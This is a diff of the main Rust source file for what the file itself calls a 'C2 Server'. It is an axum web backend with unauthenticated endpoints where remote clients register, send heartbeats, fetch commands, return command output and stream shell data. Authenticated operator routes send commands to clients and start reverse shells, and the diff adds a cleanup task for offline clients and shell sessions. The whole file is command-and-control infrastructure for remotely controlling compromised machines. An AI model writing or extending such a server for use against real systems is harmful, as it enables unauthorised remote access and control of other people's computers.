@@ -1,60 +1,100 @@
+pub mod state;
+pub mod auth;
+pub mod handlers;
+pub mod managers;
+pub mod audit;
+
 use axum::{
-    Router,
     routing::{get, post},
-    serve,
+    serve, Router,
 };
+use common::config::ConfigManager;
+use crate::{
+    auth::{auth_middleware, login_get, login_post},
+    handlers::{api, web},
+    state::AppState,
+};
+use std::time::Duration;
 use tokio::net::TcpListener;
 use tower_http::cors::CorsLayer;
 use tower_http::services::ServeDir;
 use tower_cookies::CookieManagerLayer;
 
-mod state;
-mod auth;
-mod handlers;
-
-use state::ServerState;
-use auth::{login_get, login_post, auth_middleware};
-use handlers::{api, web};
+async fn cleanup_task(state: AppState) {
+    let mut interval = tokio::time::interval(Duration::from_secs(60));
+    loop {
+        interval.tick().await;
+        let timeout_seconds = state.config.client_timeout as i64;
+        state
+            .client_manager
+            .cleanup_offline_clients(timeout_seconds)
+            .await;
+        state
+            .shell_manager
+            .cleanup_expired_sessions(timeout_seconds)
+            .await;
+    }
+}
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let state = ServerState::new();
+    // Load configuration
+    let config = ConfigManager::load_server_config("server_config.toml")
+        .map_err(|e| format!("Failed to load server config: {}", e))?;
+
+    // Initialize logger
+    env_logger::init();
+
+    // Create application state
+    let state = AppState::new(config.clone());
+
+    // Spawn background cleanup task
+    tokio::spawn(cleanup_task(state.clone()));
 
     // Routes that require authentication
     let protected_routes = Router::new()
         .route("/", get(web::index))
-        .route("/client/:id", get(web::client_detail))
+        .route("/client/{id}", get(web::client_detail))
         .route_layer(axum::middleware::from_fn_with_state(
             state.clone(),
             auth_middleware,
         ));
 
-    // API routes (unprotected or with their own auth)
-    let api_routes = Router::new()
+    // API routes for the C2 channel (no auth middleware)
+    let c2_api_routes = Router::new()
         .route("/api/register", post(api::register_client))
         .route("/api/heartbeat", post(api::handle_heartbeat))
-        .route("/api/commands/:client_id", get(api::get_commands))
+        .route("/api/commands/{client_id}", get(api::get_commands))
         .route("/api/command_result", post(api::handle_command_result))
-        .route("/api/shell_data", post(api::handle_shell_data))
+        .route("/api/shell_data", post(api::handle_shell_data));
+
+    // API routes for the web UI (these are protected by the auth middleware)
+    let web_api_routes = Router::new()
         .route("/api/clients", get(api::api_clients))
-        .route("/api/clients/:client_id/commands", post(api::send_command))
-        .route("/api/clients/:client_id/results", get(api::api_command_results))
-        .route("/api/clients/:client_id/reverse_shell", post(api::initiate_reverse_shell));
+        .route("/api/clients/{client_id}/commands", post(api::send_command))
+        .route("/api/clients/{client_id}/results", get(api::api_command_results))
+        .route("/api/clients/{client_id}/reverse_shell", post(api::initiate_reverse_shell))
+        .route_layer(axum::middleware::from_fn_with_state(
+            state.clone(),
+            auth_middleware,
+        ));
+
 
     // Main application router
     let app = Router::new()
         .route("/login", get(login_get).post(login_post))
         .merge(protected_routes)
-        .merge(api_routes)
-        // Static files
-        .nest_service("/static", ServeDir::new("web/static"))
+        .merge(c2_api_routes)
+        .merge(web_api_routes) // Merge web-specific APIs directly
+        .nest_service("/static", ServeDir::new(&config.web.static_dir))
         .layer(CorsLayer::permissive())
         .layer(CookieManagerLayer::new())
         .with_state(state);
 
-    println!("C2 Server starting on http://0.0.0.0:8080");
+    let addr = format!("{}:{}", config.host, config.port);
+    println!("C2 Server starting on http://{addr}");
 
-    let listener = TcpListener::bind("0.0.0.0:8080").await?;
+    let listener = TcpListener::bind(&addr).await?;
     
     serve(listener, app).await?;
 
